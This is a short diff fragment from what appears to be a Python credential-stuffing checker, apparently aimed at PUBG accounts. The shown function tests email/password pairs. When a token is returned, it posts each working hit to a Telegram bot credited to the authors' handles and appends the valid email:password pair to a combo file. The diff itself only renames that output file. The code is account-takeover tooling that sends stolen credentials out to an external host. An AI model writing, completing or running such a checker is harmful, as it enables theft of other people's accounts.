@@ -37,7 +37,7 @@ def CHECK(email,pess):
   if '"token"' in GO:
     print(YES)
     r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @AhmedoPlus @vv1ck 💸')
-    with open('NWE-PUBG.txt', 'a') as x:
+    with open('combo.txt', 'a') as x:
       x.write(eml+':'+pas+' |@AhmedoPlus\n')
   else:
     print(NO)
